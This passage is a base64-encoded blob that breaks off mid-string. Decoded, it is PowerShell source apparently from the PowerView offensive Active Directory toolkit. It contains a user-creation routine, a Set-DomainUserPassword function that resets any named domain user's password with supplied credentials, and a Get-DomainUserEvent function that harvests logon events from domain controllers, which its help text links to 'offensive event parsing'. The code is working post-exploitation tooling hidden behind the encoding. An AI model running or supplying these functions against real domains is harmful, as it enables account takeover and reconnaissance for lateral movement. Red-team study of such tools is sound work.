ICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7ICRDb250ZXh0QXJndW1lbnRzWydDcmVkZW50aWFsJ10gPSAkQ3JlZGVudGlhbCB9CiAgICAkQ29udGV4dCA9IEdldC1QcmluY2lwYWxDb250ZXh0IEBDb250ZXh0QXJndW1lbnRzCgogICAgaWYgKCRDb250ZXh0KSB7CiAgICAgICAgJFVzZXIgPSBOZXctT2JqZWN0IC1UeXBlTmFtZSBTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuQWNjb3VudE1hbmFnZW1lbnQuVXNlclByaW5jaXBhbCAtQXJndW1lbnRMaXN0ICgkQ29udGV4dC5Db250ZXh0KQoKICAgICAgICAjIHNldCBhbGwgdGhlIGFwcHJvcHJpYXRlIHVzZXIgcGFyYW1ldGVycwogICAgICAgICRVc2VyLlNhbUFjY291bnROYW1lID0gJENvbnRleHQuSWRlbnRpdHkKICAgICAgICAkVGVtcENyZWQgPSBOZXctT2JqZWN0IFN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsKCdhJywgJEFjY291bnRQYXNzd29yZCkKICAgICAgICAkVXNlci5TZXRQYXNzd29yZCgkVGVtcENyZWQuR2V0TmV0d29ya0NyZWRlbnRpYWwoKS5QYXNzd29yZCkKICAgICAgICAkVXNlci5FbmFibGVkID0gJFRydWUKICAgICAgICAkVXNlci5QYXNzd29yZE5vdFJlcXVpcmVkID0gJEZhbHNlCgogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ05hbWUnXSkgewogICAgICAgICAgICAkVXNlci5OYW1lID0gJE5hbWUKICAgICAgICB9CiAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICRVc2VyLk5hbWUgPSAkQ29udGV4dC5JZGVudGl0eQogICAgICAgIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydEaXNwbGF5TmFtZSddKSB7CiAgICAgICAgICAgICRVc2VyLkRpc3BsYXlOYW1lID0gJERpc3BsYXlOYW1lCiAgICAgICAgfQogICAgICAgIGVsc2UgewogICAgICAgICAgICAkVXNlci5EaXNwbGF5TmFtZSA9ICRDb250ZXh0LklkZW50aXR5CiAgICAgICAgfQoKICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydEZXNjcmlwdGlvbiddKSB7CiAgICAgICAgICAgICRVc2VyLkRlc2NyaXB0aW9uID0gJERlc2NyaXB0aW9uCiAgICAgICAgfQoKICAgICAgICBXcml0ZS1WZXJib3NlICJbTmV3LURvbWFpblVzZXJdIEF0dGVtcHRpbmcgdG8gY3JlYXRlIHVzZXIgJyRTYW1BY2NvdW50TmFtZSciCiAgICAgICAgdHJ5IHsKICAgICAgICAgICAgJE51bGwgPSAkVXNlci5TYXZlKCkKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW05ldy1Eb21haW5Vc2VyXSBVc2VyICckU2FtQWNjb3VudE5hbWUnIHN1Y2Nlc3NmdWxseSBjcmVhdGVkIgogICAgICAgICAgICAkVXNlcgogICAgICAgIH0KICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIltOZXctRG9tYWluVXNlcl0gRXJyb3IgY3JlYXRpbmcgdXNlciAnJFNhbUFjY291bnROYW1lJyA6ICRfIgogICAgICAgIH0KICAgIH0KfQoKCmZ1bmN0aW9uIFNldC1Eb21haW5Vc2VyUGFzc3dvcmQgewo8IwouU1lOT1BTSVMKClNldHMgdGhlIHBhc3N3b3JkIGZvciBhIGdpdmVuIHVzZXIgaWRlbnRpdHkuCgpBdXRob3I6IFdpbGwgU2Nocm9lZGVyIChAaGFybWoweSkgIApMaWNlbnNlOiBCU0QgMy1DbGF1c2UgIApSZXF1aXJlZCBEZXBlbmRlbmNpZXM6IEdldC1QcmluY2lwYWxDb250ZXh0ICAKCi5ERVNDUklQVElPTgoKRmlyc3QgYmluZHMgdG8gdGhlIHNwZWNpZmllZCBkb21haW4gY29udGV4dCB1c2luZyBHZXQtUHJpbmNpcGFsQ29udGV4dC4KVGhlIGJvdW5kIGRvbWFpbiBjb250ZXh0IGlzIHRoZW4gdXNlZCB0byBzZWFyY2ggZm9yIHRoZSBzcGVjaWZpZWQgdXNlciAtSWRlbnRpdHksCndoaWNoIHJldHVybnMgYSBEaXJlY3RvcnlTZXJ2aWNlcy5BY2NvdW50TWFuYWdlbWVudC5Vc2VyUHJpbmNpcGFsIG9iamVjdC4gVGhlClNldFBhc3N3b3JkKCkgZnVuY3Rpb24gaXMgdGhlbiBpbnZva2VkIG9uIHRoZSB1c2VyLCBzZXR0aW5nIHRoZSBwYXNzd29yZCB0byAtQWNjb3VudFBhc3N3b3JkLgoKLlBBUkFNRVRFUiBJZGVudGl0eQoKQSB1c2VyIFNhbUFjY291bnROYW1lIChlLmcuIFVzZXIxKSwgRGlzdGluZ3Vpc2hlZE5hbWUgKGUuZy4gQ049dXNlcjEsQ049VXNlcnMsREM9dGVzdGxhYixEQz1sb2NhbCksClNJRCAoZS5nLiBTLTEtNS0yMS04OTAxNzE4NTktMzQzMzgwOTI3OS0zMzY2MTk2NzUzLTExMTMpLCBvciBHVUlEIChlLmcuIDRjNDM1ZGQ3LWRjNTgtNGIxNC05YTVlLTFmZGIwZTgwZDIwMSkKc3BlY2lmeWluZyB0aGUgdXNlciB0byByZXNldCB0aGUgcGFzc3dvcmQgZm9yLgoKLlBBUkFNRVRFUiBBY2NvdW50UGFzc3dvcmQKClNwZWNpZmllcyB0aGUgcGFzc3dvcmQgdG8gcmVzZXQgdGhlIHRhcmdldCB1c2VyJ3MgdG8uIE1hbmRhdG9yeS4KCi5QQVJBTUVURVIgRG9tYWluCgpTcGVjaWZpZXMgdGhlIGRvbWFpbiB0byB1c2UgdG8gc2VhcmNoIGZvciB0aGUgdXNlciBpZGVudGl0eSwgZGVmYXVsdHMgdG8gdGhlIGN1cnJlbnQgZG9tYWluLgoKLlBBUkFNRVRFUiBDcmVkZW50aWFsCgpBIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXSBvYmplY3Qgb2YgYWx0ZXJuYXRlIGNyZWRlbnRpYWxzCmZvciBjb25uZWN0aW9uIHRvIHRoZSB0YXJnZXQgZG9tYWluLgoKLkVYQU1QTEUKCiRVc2VyUGFzc3dvcmQgPSBDb252ZXJ0VG8tU2VjdXJlU3RyaW5nICdQYXNzd29yZDEyMyEnIC1Bc1BsYWluVGV4dCAtRm9yY2UKU2V0LURvbWFpblVzZXJQYXNzd29yZCAtSWRlbnRpdHkgYW5keSAtQWNjb3VudFBhc3N3b3JkICRVc2VyUGFzc3dvcmQKClJlc2V0cyB0aGUgcGFzc3dvcmQgZm9yICdhbmR5JyB0byB0aGUgcGFzc3dvcmQgc3BlY2lmaWVkLgoKLkVYQU1QTEUKCiRTZWNQYXNzd29yZCA9IENvbnZlcnRUby1TZWN1cmVTdHJpbmcgJ1Bhc3N3b3JkMTIzIScgLUFzUGxhaW5UZXh0IC1Gb3JjZQokQ3JlZCA9IE5ldy1PYmplY3QgU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWwoJ1RFU1RMQUJcZGZtLmEnLCAkU2VjUGFzc3dvcmQpCiRVc2VyUGFzc3dvcmQgPSBDb252ZXJ0VG8tU2VjdXJlU3RyaW5nICdQYXNzd29yZDEyMyEnIC1Bc1BsYWluVGV4dCAtRm9yY2UKU2V0LURvbWFpblVzZXJQYXNzd29yZCAtSWRlbnRpdHkgYW5keSAtQWNjb3VudFBhc3N3b3JkICRVc2VyUGFzc3dvcmQgLUNyZWRlbnRpYWwgJENyZWQKClJlc2V0cyB0aGUgcGFzc3dvcmQgZm9yICdhbmR5JyB1c2VyaW5nIHRoZSBhbHRlcm5hdGUgY3JlZGVudGlhbHMgc3BlY2lmaWVkLgoKLk9VVFBVVFMKCkRpcmVjdG9yeVNlcnZpY2VzLkFjY291bnRNYW5hZ2VtZW50LlVzZXJQcmluY2lwYWwKCi5MSU5LCgpodHRwOi8vcmljaGFyZHNwb3dlcnNoZWxsYmxvZy53b3JkcHJlc3MuY29tLzIwMDgvMDUvMjUvc3lzdGVtLWRpcmVjdG9yeXNlcnZpY2VzLWFjY291bnRtYW5hZ2VtZW50LwojPgoKICAgIFtEaWFnbm9zdGljcy5Db2RlQW5hbHlzaXMuU3VwcHJlc3NNZXNzYWdlQXR0cmlidXRlKCdQU1VzZVNob3VsZFByb2Nlc3NGb3JTdGF0ZUNoYW5naW5nRnVuY3Rpb25zJywgJycpXQogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTU2hvdWxkUHJvY2VzcycsICcnKV0KICAgIFtPdXRwdXRUeXBlKCdEaXJlY3RvcnlTZXJ2aWNlcy5BY2NvdW50TWFuYWdlbWVudC5Vc2VyUHJpbmNpcGFsJyldCiAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJFRydWUpXQogICAgICAgIFtBbGlhcygnVXNlck5hbWUnLCAnVXNlcklkZW50aXR5JywgJ1VzZXInKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRJZGVudGl0eSwKCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkVHJ1ZSldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ1Bhc3N3b3JkJyldCiAgICAgICAgW1NlY3VyaXR5LlNlY3VyZVN0cmluZ10KICAgICAgICAkQWNjb3VudFBhc3N3b3JkLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJERvbWFpbiwKCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5DcmVkZW50aWFsQXR0cmlidXRlKCldCiAgICAgICAgJENyZWRlbnRpYWwgPSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5CiAgICApCgogICAgJENvbnRleHRBcmd1bWVudHMgPSBAeyAnSWRlbnRpdHknID0gJElkZW50aXR5IH0KICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0RvbWFpbiddKSB7ICRDb250ZXh0QXJndW1lbnRzWydEb21haW4nXSA9ICREb21haW4gfQogICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7ICRDb250ZXh0QXJndW1lbnRzWydDcmVkZW50aWFsJ10gPSAkQ3JlZGVudGlhbCB9CiAgICAkQ29udGV4dCA9IEdldC1QcmluY2lwYWxDb250ZXh0IEBDb250ZXh0QXJndW1lbnRzCgogICAgaWYgKCRDb250ZXh0KSB7CiAgICAgICAgJFVzZXIgPSBbU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkFjY291bnRNYW5hZ2VtZW50LlVzZXJQcmluY2lwYWxdOjpGaW5kQnlJZGVudGl0eSgkQ29udGV4dC5Db250ZXh0LCAkSWRlbnRpdHkpCgogICAgICAgIGlmICgkVXNlcikgewogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbU2V0LURvbWFpblVzZXJQYXNzd29yZF0gQXR0ZW1wdGluZyB0byBzZXQgdGhlIHBhc3N3b3JkIGZvciB1c2VyICckSWRlbnRpdHknIgogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgJFRlbXBDcmVkID0gTmV3LU9iamVjdCBTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbCgnYScsICRBY2NvdW50UGFzc3dvcmQpCiAgICAgICAgICAgICAgICAkVXNlci5TZXRQYXNzd29yZCgkVGVtcENyZWQuR2V0TmV0d29ya0NyZWRlbnRpYWwoKS5QYXNzd29yZCkKCiAgICAgICAgICAgICAgICAkTnVsbCA9ICRVc2VyLlNhdmUoKQogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW1NldC1Eb21haW5Vc2VyUGFzc3dvcmRdIFBhc3N3b3JkIGZvciB1c2VyICckSWRlbnRpdHknIHN1Y2Nlc3NmdWxseSByZXNldCIKICAgICAgICAgICAgfQogICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICBXcml0ZS1XYXJuaW5nICJbU2V0LURvbWFpblVzZXJQYXNzd29yZF0gRXJyb3Igc2V0dGluZyBwYXNzd29yZCBmb3IgdXNlciAnJElkZW50aXR5JyA6ICRfIgogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGVsc2UgewogICAgICAgICAgICBXcml0ZS1XYXJuaW5nICJbU2V0LURvbWFpblVzZXJQYXNzd29yZF0gVW5hYmxlIHRvIGZpbmQgdXNlciAnJElkZW50aXR5JyIKICAgICAgICB9CiAgICB9Cn0KCgpmdW5jdGlvbiBHZXQtRG9tYWluVXNlckV2ZW50IHsKPCMKLlNZTk9QU0lTCgpFbnVtZXJhdGUgYWNjb3VudCBsb2dvbiBldmVudHMgKElEIDQ2MjQpIGFuZCBMb2dvbiB3aXRoIGV4cGxpY2l0IGNyZWRlbnRpYWwKZXZlbnRzIChJRCA0NjQ4KSBmcm9tIHRoZSBzcGVjaWZpZWQgaG9zdCAoZGVmYXVsdCBvZiB0aGUgbG9jYWxob3N0KS4KCkF1dGhvcjogTGVlIENocmlzdGVuc2VuIChAdGlma2luXyksIEp1c3RpbiBXYXJuZXIgKEBzaXhkdWIpLCBXaWxsIFNjaHJvZWRlciAoQGhhcm1qMHkpICAKTGljZW5zZTogQlNEIDMtQ2xhdXNlICAKUmVxdWlyZWQgRGVwZW5kZW5jaWVzOiBOb25lICAKCi5ERVNDUklQVElPTgoKVGhpcyBmdW5jdGlvbiB1c2VzIGFuIFhNTCBwYXRoIGZpbHRlciBwYXNzZWQgdG8gR2V0LVdpbkV2ZW50IHRvIHJldHJpZXZlCnNlY3VyaXR5IGV2ZW50cyB3aXRoIElEcyBvZiA0NjI0IChsb2dvbiBldmVudHMpIG9yIDQ2NDggKGV4cGxpY2l0IGNyZWRlbnRpYWwKbG9nb24gZXZlbnRzKSBmcm9tIC1TdGFydFRpbWUgKGRlZmF1bHQgb2Ygbm93LTEgZGF5KSB0byAtRW5kVGltZSAoZGVmYXVsdCBvZiBub3cpLgpBIG1heGltdW0gb2YgLU1heEV2ZW50cyAoZGVmYXVsdCBvZiA1MDAwKSBhcmUgcmV0dXJuZWQuCgouUEFSQU1FVEVSIENvbXB1dGVyTmFtZQoKU3BlY2lmaWVzIHRoZSBjb21wdXRlciBuYW1lIHRvIHJldHJpZXZlIGV2ZW50cyBmcm9tLCBkZWZhdWx0IG9mIGxvY2FsaG9zdC4KCi5QQVJBTUVURVIgU3RhcnRUaW1lCgpUaGUgW0RhdGVUaW1lXSBvYmplY3QgcmVwcmVzZW50aW5nIHRoZSBzdGFydCBvZiB3aGVuIHRvIGNvbGxlY3QgZXZlbnRzLgpEZWZhdWx0IG9mIFtEYXRlVGltZV06Ok5vdy5BZGREYXlzKC0xKS4KCi5QQVJBTUVURVIgRW5kVGltZQoKVGhlIFtEYXRlVGltZV0gb2JqZWN0IHJlcHJlc2VudGluZyB0aGUgZW5kIG9mIHdoZW4gdG8gY29sbGVjdCBldmVudHMuCkRlZmF1bHQgb2YgW0RhdGVUaW1lXTo6Tm93LgoKLlBBUkFNRVRFUiBNYXhFdmVudHMKClRoZSBtYXhpbXVtIG51bWJlciBvZiBldmVudHMgdG8gcmV0cmlldmUuIERlZmF1bHQgb2YgNTAwMC4KCi5QQVJBTUVURVIgQ3JlZGVudGlhbAoKQSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0gb2JqZWN0IG9mIGFsdGVybmF0ZSBjcmVkZW50aWFscwpmb3IgY29ubmVjdGlvbiB0byB0aGUgdGFyZ2V0IGNvbXB1dGVyLgoKLkVYQU1QTEUKCkdldC1Eb21haW5Vc2VyRXZlbnQKClJldHVybiBsb2dvbiBldmVudHMgb24gdGhlIGxvY2FsIG1hY2hpbmUuCgouRVhBTVBMRQoKR2V0LURvbWFpbkNvbnRyb2xsZXIgfCBHZXQtRG9tYWluVXNlckV2ZW50IC1TdGFydFRpbWUgKFtEYXRlVGltZV06Ok5vdy5BZGREYXlzKC0zKSkKClJldHVybiBhbGwgbG9nb24gZXZlbnRzIGZyb20gdGhlIGxhc3QgMyBkYXlzIGZyb20gZXZlcnkgZG9tYWluIGNvbnRyb2xsZXIgaW4gdGhlIGN1cnJlbnQgZG9tYWluLgoKLkVYQU1QTEUKCiRTZWNQYXNzd29yZCA9IENvbnZlcnRUby1TZWN1cmVTdHJpbmcgJ1Bhc3N3b3JkMTIzIScgLUFzUGxhaW5UZXh0IC1Gb3JjZQokQ3JlZCA9IE5ldy1PYmplY3QgU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWwoJ1RFU1RMQUJcZGZtLmEnLCAkU2VjUGFzc3dvcmQpCkdldC1Eb21haW5Vc2VyRXZlbnQgLUNvbXB1dGVyTmFtZSBQUklNQVJZLnRlc3RsYWIubG9jYWwgLUNyZWRlbnRpYWwgJENyZWQgLU1heEV2ZW50cyAxMDAwCgpSZXR1cm4gYSBtYXggb2YgMTAwMCBsb2dvbiBldmVudHMgZnJvbSB0aGUgc3BlY2lmaWVkIG1hY2hpbmUgdXNpbmcgdGhlIHNwZWNpZmllZCBhbHRlcm5hdGUgY3JlZGVudGlhbHMuCgouT1VUUFVUUwoKUG93ZXJWaWV3LkxvZ29uRXZlbnQKClBvd2VyVmlldy5FeHBsaWNpdENyZWRlbnRpYWxMb2dvbkV2ZW50CgouTElOSwoKaHR0cDovL3d3dy5zaXhkdWIubmV0LzIwMTQvMTEvMDcvb2ZmZW5zaXZlLWV2ZW50LXBhcnNpbmctYnJpbmdpbmctaG9tZS10cm9waGllcy8KIz4KCiAgICBbRGlhZ25vc3RpY3MuQ29kZUFuYWx5c2lzLlN1cHByZXNzTWVzc2FnZUF0dHJpYnV0ZSgnUFNTaG91bGRQcm9jZXNzJywgJycpXQogICAgW091dHB1dFR5cGUoJ1Bvd2VyVmlldy5Mb2dvbkV2ZW50JyldCiAgICBbT3V0cHV0VHlwZSgnUG93ZXJWaWV3LkV4cGxpY2l0Q3JlZGVudGlhbExvZ29uRXZlbnQnKV0KICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICRUcnVlKV0KICAgICAgICBbQWxpYXMoJ2Ruc2hvc3RuYW1lJywgJ0hvc3ROYW1lJywgJ25hbWUnKV0KICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkQ29tcHV0ZXJOYW1lID0gJEVudjpDT01QVVRFUk5BTUUsCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0RhdGVUaW1lXQogICAgICAgICRTdGFydFRpbWUgPSBbRGF0ZVRpbWVdOjpOb3cuQWRkRGF5cygtMSksCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0RhdGVUaW1lXQogICAgICAgICRFbmRUaW1lID0gW0RhdGVUaW1lXTo6Tm93LAoKICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLCAxMDAwMDAwKV0KICAgICAgICBbSW50XQogICAgICAgICRNYXhFdmVudHMgPSA1MDAwLAoKICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLkNyZWRlbnRpYWxBdHRyaWJ1dGUoKV0KICAgICAgICAkQ3JlZGVudGlhbCA9IFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHkKICAgICkKCiAgICBCRUdJTiB7CiAgICAgICAgIyB0aGUgWE1MIGZpbHRlciB3ZSdyZSBwYXNzaW5nIHRvIEdldC1XaW5FdmVudAogICAgICAgICRYUGF0aEZpbHRlciA9IEAiCjxRdWVyeUxpc3Q+CiAgICA8UXVlcnkgSWQ9IjAiIFBhdGg9IlNlY3VyaXR5Ij4KCiAgICAgICAgPCEtLSBMb2dvbiBldmVudHMgLS0+CiAgICAgICAgPFNlbGVjdCBQYXRoPSJTZWN1cml0eSI+CiAgICAgICAgICAgICpbCiAgICAgICAgICAgICAgICBTeXN0ZW1bCiAgICAgICAgICAgICAgICAgICAgUHJvdmlkZXJbCiAgICAgICAgICAgICAgICAgICAgICAgIEBOYW1lPSdNaWNyb3NvZnQtV2luZG93cy1TZWN1cml0eS1BdWRpdGluZycKICAgICAgICAgICAgICAgICAgICBdCiAgICAgICAgICAgICAgICAgICAgYW5kIChMZXZlbD00IG9yIExldmVsPTApIGFuZCAoRXZlbnRJRD00NjI0KQogICAgICAgICAgICAgICAgICAgIGFuZCBUaW1lQ3JlYXRlZFsKICAgICAgICAgICAgICAgICAgICAgICAgQFN5c3RlbVRpbWUmZ3Q7PSckKCRTdGFydFRpbWUuVG9Vbml2ZXJzYWxUaW1lKCkuVG9TdHJpbmcoJ3MnKSknIGFuZCBAU3lzdGVtVGltZSZsdDs9JyQoJEVuZFRpbWUuVG9Vbml2ZXJzYWxUaW1lKCkuVG9TdHJpbmcoJ3MnKSknCiAgICAgICAgICAgICAgICAgICAgXQogICAgICAgICAgICAgICAgXQogICAgICAgICAgICBdCiAgICAgICAgICAgIGFuZAogICAgICAgICAgICAqW0V2ZW50RGF0YVtEYXRhW0BOYW1lPSdUYXJnZXRVc2VyTmFtZSddICE9ICdBTk9OWU1PVVMgTE9HT04nXV0KICAgICAgICA8L1NlbGVjdD4KCiAgICAgICAgPCEtLSBMb2dvbiB3aXRoIGV4cGxpY2l0IGNyZWRlbnRpYWwgZXZlbnRzIC0tPgogICAgICAgIDxTZWxlY3QgUGF0aD0iU2VjdXJpdHkiPgogICAgICAgICAgICAqWwogICAgICAgICAgICAgICAgU3lzdGVtWwogICAgICAgICAgICAgICAgICAgIFByb3ZpZGVyWwogICAgICAgICAgICAgICAgICAgICAgICBATmFtZT0nTWljcm9zb2Z0LVdpbmRvd3MtU2VjdXJpdHktQXVkaXRpbmcnCiAgICAgICAgICAgICAgICAgICAgXQogICAgICAgICAgICAgICAgICAgIGFuZCAoTGV2ZWw9NCBvciBMZXZlbD0wKSBhbmQgKEV2ZW50SUQ9NDY0OCkKICAgICAgICAgICAgICAgICAgICBhbmQgVGltZUNyZWF0ZWRbCiAgICAgICAgICAgICAgICAgICAgICAgIEBTeXN0ZW1UaW1lJmd0Oz0nJCgkU3RhcnRUaW1lLlRvVW5pdmVyc2FsVGltZSgpLlRvU3RyaW5nKCdzJykpJyBhbmQgQFN5c3RlbVRpbWUmbHQ7PSckKCRFbmRUaW1lLlRvVW5pdmVyc2FsVGltZSgpLlRvU3RyaW5nKCdzJykpJwogICAgICAgICAgICAgICAgICAgIF0KICAgICAgICAgICAgICAgIF0KICAgICAgICAgICAgXQogICAgICAgIDwvU2VsZWN0PgoKICAgICAgICA8U3VwcHJlc3MgUGF0aD0iU2VjdXJpdHkiPgogICAgICAgICAgICAqWwogICAgICAgICAgICAgICAgU3lzdGVtWwogICAgICAgICAgICAgICAgICAgIFByb3ZpZGVyWwogICAgICAgICAgICAgICAgICAgICAgICBATmFtZT0nTWljcm9zb2Z0LVdpbmRvd3MtU2VjdXJpdHktQXVkaXRpbmcnCiAgICAgICAgICAgICAgICAgICAgXQogICAgICAgICAgICAgICAgICAgIGFuZAogICAgICAgICAgICAgICAgICAgIChMZXZlbD00IG9yIExldmVsPTApIGFuZCAoRXZlbnRJRD00NjI0IG9yIEV2ZW50SUQ9NDYyNSBvciBFdmVudElEPTQ2MzQpCiAgICAgICAgICAgICAgICBdCiAgICAgICAgICAgIF0KICAgICAgICAgICAgYW5kCiAgICAgICAgICAgICpbCiAgICAgICAgICAgICAgICBFdmVudERhdGFbCiAgICAgICAgICAgICAgICAgICAgKAogICAgICAgICAgICAgICAgICAgICAgICAoRGF0YVtATmFtZT0nTG9nb25UeXBlJ109JzUnIG9yIERhdGFbQE5hbWU9J0xvZ29uVHlwZSddPScwJykKICAgICAgICAgICAgICAgICAgICAgICAgb3IKICAgICAgICAgICAgICAgICAgICAgICAgRGF0YVtATmFtZT0nVGFyZ2V0VXNlck5hbWUnXT0nQU5PTllNT1VTIExPR09OJwogICAgICAgICAgICAgICAgICAgICAgICBvcgogICAgICAgICAgICAgICAgICAgICAgICBEYXRhW0BOYW1lPSdUYXJnZXRVc2VyU0lEJ109J1MtMS01LTE4JwogICAgICAgICAgICAgICAgICAgICkKICAgICAgICAgICAgICAgIF0KICAgICAgICAgICAgXQogICAgICAgIDwvU3VwcHJlc3M+CiAgICA8L1F1ZXJ5Pgo8L1F1ZXJ5TGlzdD4KIkAKICAgICAgICAkRXZlbnRBcmd1bWVudHMgPSBAewogICAgICAgICAgICAnRmlsdGVyWFBhdGgnID0gJFhQYXRoRmlsdGVyCiAgICAgICAgICAgICdMb2dOYW1lJyA9ICdTZWN1cml0eScKICAgICAgICAgICAgJ01heEV2ZW50cycgPSAkTWF4RXZlbnRzCiAgICAgICAgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgeyAkRXZlbnRBcmd1bWVudHNbJ0NyZWRlbnRpYWwnXSA9ICRDcmVkZW50aWFsIH0KICAgIH0KCiAgICBQUk9DRVNTIHsKICAgICAgICBGb3JFYWNoICgkQ29tcHV0ZXIgaW4gJENvbXB1dGVyTmFtZSkgewoKICAgICAgICAgICAgJEV2ZW50QXJndW1lbnRzWydDb21wdXRlck5hbWUnXSA9ICRDb21wdXRlcgoKICAgICAgICAgICAgR2V0LVdpbkV2ZW50IEBFdmVudEFyZ3VtZW50c3wgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgJEV2ZW50ID0gJF8KICAgICAgICAgICAgICAgICRQcm9wZXJ0aWVzID0gJEV2ZW50LlByb3BlcnRpZXMKICAgICAgICAgICAgICAgIFN3aXRjaCAoJEV2ZW50LklkKSB7CiAgICAgICAgICAgICAgICAgICAgIyBsb2dvbiBldmVudAogICAgICAgICAgICAgICAgICAgIDQ2MjQgewogICAgICAgICAgICAgICAgICAgICAgICAjIHNraXAgY29tcHV0ZXIgbG9nb25zLCBmb3Igbm93Li4uCiAgICAgICAgICAgICAgICAgICAgICAgIGlmKC1ub3QgJFByb3BlcnRpZXNbNV0uVmFsdWUuRW5kc1dpdGgoJyQnKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJE91dHB1dCA9IE5ldy1PYmplY3QgUFNPYmplY3QgLVByb3BlcnR5IEB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQ29tcHV0ZXJOYW1lICAgICAgICAgICAgICA9ICRDb21wdXRlcgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFRpbWVDcmVhdGVkICAgICAgICAgICAgICAgPSAkRXZlbnQuVGltZUNyZWF0ZWQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBFdmVudElkICAgICAgICAgICAgICAgICAgID0gJEV2ZW50LklkCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgU3ViamVjdFVzZXJTaWQgICAgICAgICAgICA9ICRQcm9wZXJ0aWVzWzBdLlZhbHVlLlRvU3RyaW5nKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBTdWJqZWN0VXNlck5hbWUgICAgICAgICAgID0gJFByb3BlcnRpZXNbMV0uVmFsdWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBTdWJqZWN0RG9tYWluTmFtZSAgICAgICAgID0gJFByb3BlcnRpZXNbMl0uVmFsdWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBTdWJqZWN0TG9nb25JZCAgICAgICAgICAgID0gJFByb3BlcnRpZXNbM10uVmFsdWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBUYXJnZXRVc2VyU2lkICAgICAgICAgICAgID0gJFByb3BlcnRpZXNbNF0uVmFsdWUuVG9TdHJpbmcoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFRhcmdldFVzZXJOYW1lICAgICAgICAgICAgPSAkUHJvcGVydGllc1s1XS5WYWx1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFRhcmdldERvbWFpbk5hbWUgICAgICAgICAgPSAkUHJvcGVydGllc1s2XS5WYWx1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFRhcmdldExvZ29uSWQgICAgICAgICAgICAgPSAkUHJvcGVydGllc1s3XS5WYWx1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIExvZ29uVHlwZSAgICAgICAgICAgICAgICAgPSAkUHJvcGVydGllc1s4XS5WYWx1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIExvZ29uUHJvY2Vzc05hbWUgICAgICAgICAgPSAkUHJvcGVydGl